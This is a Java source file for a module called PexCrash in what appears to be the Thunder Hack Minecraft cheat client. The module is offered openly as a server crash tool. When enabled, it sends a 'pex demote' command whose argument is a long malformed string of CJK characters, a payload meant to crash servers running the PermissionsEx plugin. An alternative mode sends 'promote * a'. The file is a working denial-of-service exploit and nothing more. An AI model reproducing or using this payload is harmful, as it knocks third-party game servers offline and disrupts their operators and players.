// Ported from HackVogel/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;

public class PexCrash extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.Demote);
    private boolean sent = false;

    public PexCrash() {
        super("PexCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        sent = true;

        switch (mode.getValue()) {
            case Demote -> mc.player.networkHandler.sendCommand("pex demote $({^.#䐷噃摂潡䕓欹䵎啘琷㒶乇㉦㠰愳㡅㒴汬㠷煸儱䝖䥲倱慅卆流䵨啶獖歄䕧眶元她䴷癋㕰#.^})");
            case Promote -> mc.player.networkHandler.sendCommand("promote * a");
        }
        sendMessage("PEX crash sent");
        disable();
    }

    @Override
    public void onDisable() {
        sent = false;
    }

    public enum Mode {
        Demote, Promote
    }
}
